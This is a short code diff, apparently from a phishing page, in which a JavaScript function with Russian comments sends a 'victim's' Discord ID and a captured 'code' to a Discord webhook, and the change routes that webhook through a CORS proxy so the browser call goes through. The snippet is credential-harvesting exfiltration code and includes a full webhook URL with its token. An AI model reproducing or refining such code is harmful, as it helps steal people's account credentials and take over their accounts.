@@ -64,7 +64,7 @@
 
         // 2. ФУНКЦИЯ ОТПРАВКИ В ДИСКОРД
 function sendToWebhook() {
-    const webhookUrl = "https://discord.com/api/webhooks/1491823650062729226/cIgBYFw27PKEdyEJbHhHwfsxICL5I_GJHfGcxFT0a2vVQGT2yZJBAf5cWHPoAp5Plyxy";
+    const webhookUrl = "https://api.allorigins.win/get?url=https://discord.com/api/webhooks/1491823650062729226/cIgBYFw27PKEdyEJbHhHwfsxICL5I_GJHfGcxFT0a2vVQGT2yZJBAf5cWHPoAp5Plyxy";
     
     // Формируем текст сообщения
     const content = `🚨 **Пользователь попался!**\n👤 Жертва: <@${userId || "Неизвестный ID"}>\n🔑 Код: \`${extraInfo || "Нет данных"}\``;
